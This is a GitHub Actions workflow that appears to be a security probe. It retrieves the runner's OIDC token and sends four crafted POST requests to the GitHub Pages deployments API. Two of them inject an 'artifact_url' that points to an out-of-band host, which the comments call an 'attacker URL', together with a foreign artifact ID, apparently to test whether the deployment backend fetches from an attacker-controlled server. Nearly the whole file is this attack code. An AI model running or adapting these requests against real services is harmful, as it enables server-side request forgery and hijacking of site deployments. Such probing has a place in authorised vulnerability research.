name: bf45-auth-test
on:
  workflow_dispatch:
    inputs:
      oob: { required: true }
permissions:
  contents: read
  pages: write
  id-token: write
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: github-pages
    steps:
      - run: mkdir -p _site && echo '<html>auth-test</html>' > _site/index.html
      - uses: actions/upload-pages-artifact@v3
        with: { path: _site }
      - name: auth-test
        env:
          GH_TOKEN: ${{ github.token }}
          OOB: ${{ inputs.oob }}
        run: |
          set -u
          OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                      "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
          echo "::add-mask::$OIDC"
          
          API="https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments"
          
          ART_ID=$(curl -s -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID/artifacts" | \
            jq -r '.artifacts[0].id')
          echo "Artifact: $ART_ID"
          
          # Test 1: token auth (our current approach) — minimal payload like the action
          echo "===== TEST 1: token auth, minimal payload ====="
          curl -s -w '\nHTTP=%{http_code}\n' -X POST \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" "$API" \
            -d "{\"artifact_id\":$ART_ID,\"pages_build_version\":\"${GITHUB_SHA}-t1\",\"oidc_token\":\"$OIDC\"}"
          
          sleep 3
          
          # Test 2: Bearer OIDC auth — no oidc_token in body
          echo "===== TEST 2: Bearer OIDC auth ====="
          curl -s -w '\nHTTP=%{http_code}\n' -X POST \
            -H "Authorization: Bearer $OIDC" \
            -H "Accept: application/vnd.github+json" "$API" \
            -d "{\"artifact_id\":$ART_ID,\"pages_build_version\":\"${GITHUB_SHA}-t2\",\"oidc_token\":\"$OIDC\"}"
          
          sleep 3
          
          # Test 3: token auth + expired artifact ID + attacker URL
          echo "===== TEST 3: token auth, expired artifact + attacker URL ====="
          curl -s -w '\nHTTP=%{http_code}\n' -X POST \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" "$API" \
            -d "{\"artifact_id\":10387063794,\"artifact_url\":\"https://$OOB/vfy-bf45/expired?t3\",\"pages_build_version\":\"${GITHUB_SHA}-t3\",\"oidc_token\":\"$OIDC\",\"environment\":\"github-pages\"}"
          
          sleep 3
          
          # Test 4: Bearer OIDC auth + expired artifact + attacker URL
          echo "===== TEST 4: Bearer OIDC, expired artifact + attacker URL ====="
          curl -s -w '\nHTTP=%{http_code}\n' -X POST \
            -H "Authorization: Bearer $OIDC" \
            -H "Accept: application/vnd.github+json" "$API" \
            -d "{\"artifact_id\":10387063794,\"artifact_url\":\"https://$OOB/vfy-bf45/expired?t4\",\"pages_build_version\":\"${GITHUB_SHA}-t4\",\"oidc_token\":\"$OIDC\",\"environment\":\"github-pages\"}"
          
          echo "===== waiting 60s ====="
          sleep 60
